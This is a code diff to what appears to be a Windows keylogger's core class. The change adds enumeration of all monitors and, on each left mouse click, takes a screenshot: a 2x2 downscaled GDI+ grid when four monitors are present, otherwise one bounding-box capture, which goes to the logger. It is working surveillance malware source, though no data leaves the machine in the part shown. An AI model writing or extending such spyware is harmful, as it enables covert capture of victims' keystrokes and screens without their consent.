@@ -1,6 +1,8 @@
 #include "KeyloggerCore.h"
 #include <chrono>
 #include <filesystem>
+#include <vector>
+#include <gdiplus.h>
 
 KeyloggerCore::KeyloggerCore() : running(false), logging(false), screenshots(false), stopThread(false), topLeftX(-1), topLeftY(-1), botRightX(-1), botRightY(-1) {}
 
@@ -59,16 +61,70 @@ void KeyloggerCore::run() {
     unsigned char c;
     bool leftDown = false;
     while (!stopThread) {
-        topLeftX = topLeftY = -1; botRightX = botRightY = -1;
-        EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, reinterpret_cast<LPARAM>(this));
-        POINT a{topLeftX, topLeftY};
-        POINT b{botRightX, botRightY};
+        // --- Monitor enumeration ---
+        std::vector<RECT> monitors;
+        EnumDisplayMonitors(NULL, NULL, [](HMONITOR hMonitor, HDC, LPRECT lprcMonitor, LPARAM dwData) -> BOOL {
+            auto* vec = reinterpret_cast<std::vector<RECT>*>(dwData);
+            vec->push_back(*lprcMonitor);
+            return TRUE;
+        }, reinterpret_cast<LPARAM>(&monitors));
+
         // Screenshots independent of logging
         if (screenshots && (GetKeyState(VK_LBUTTON) & 0x80) != 0) {
             if (!leftDown) {
-                a.x = topLeftX; a.y = topLeftY;
-                b.x = botRightX; b.y = botRightY;
-                logger.screenshot(a, b);
+                if (monitors.size() == 4) {
+                    // --- 2x2 grid for 4 monitors ---
+                    int w = monitors[0].right - monitors[0].left;
+                    int h = monitors[0].bottom - monitors[0].top;
+                    int new_w = static_cast<int>(w / 1.25);
+                    int new_h = static_cast<int>(h / 1.25);
+
+                    int grid_w = new_w * 2;
+                    int grid_h = new_h * 2;
+
+                    Gdiplus::Bitmap gridBmp(grid_w, grid_h, PixelFormat32bppARGB);
+                    Gdiplus::Graphics g(&gridBmp);
+
+                    HDC hScreen = GetDC(HWND_DESKTOP);
+
+                    for (int i = 0; i < 4; ++i) {
+                        int x = monitors[i].left;
+                        int y = monitors[i].top;
+                        HDC hDc = CreateCompatibleDC(hScreen);
+                        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, new_w, new_h);
+                        HGDIOBJ old_obj = SelectObject(hDc, hBitmap);
+                        SetStretchBltMode(hDc, HALFTONE);
+                        StretchBlt(hDc, 0, 0, new_w, new_h, hScreen, x, y, w, h, SRCCOPY);
+
+                        Gdiplus::Bitmap bmp(hBitmap, NULL);
+
+                        int dest_x = (i % 2) * new_w;
+                        int dest_y = (i / 2) * new_h;
+                        g.DrawImage(&bmp, dest_x, dest_y, new_w, new_h);
+
+                        SelectObject(hDc, old_obj);
+                        DeleteDC(hDc);
+                        DeleteObject(hBitmap);
+                    }
+                    ReleaseDC(HWND_DESKTOP, hScreen);
+
+                    logger.screenshotBitmap(&gridBmp);
+                } else {
+                    // Fallback: original logic
+                    int topLeftX = monitors.empty() ? 0 : monitors[0].left;
+                    int topLeftY = monitors.empty() ? 0 : monitors[0].top;
+                    int botRightX = monitors.empty() ? 0 : monitors[0].right;
+                    int botRightY = monitors.empty() ? 0 : monitors[0].bottom;
+                    for (const auto& r : monitors) {
+                        if (r.left < topLeftX) topLeftX = r.left;
+                        if (r.top < topLeftY) topLeftY = r.top;
+                        if (r.right > botRightX) botRightX = r.right;
+                        if (r.bottom > botRightY) botRightY = r.bottom;
+                    }
+                    POINT a{topLeftX, topLeftY};
+                    POINT b{botRightX, botRightY};
+                    logger.screenshot(a, b);
+                }
                 leftDown = true;
             }
         } else {
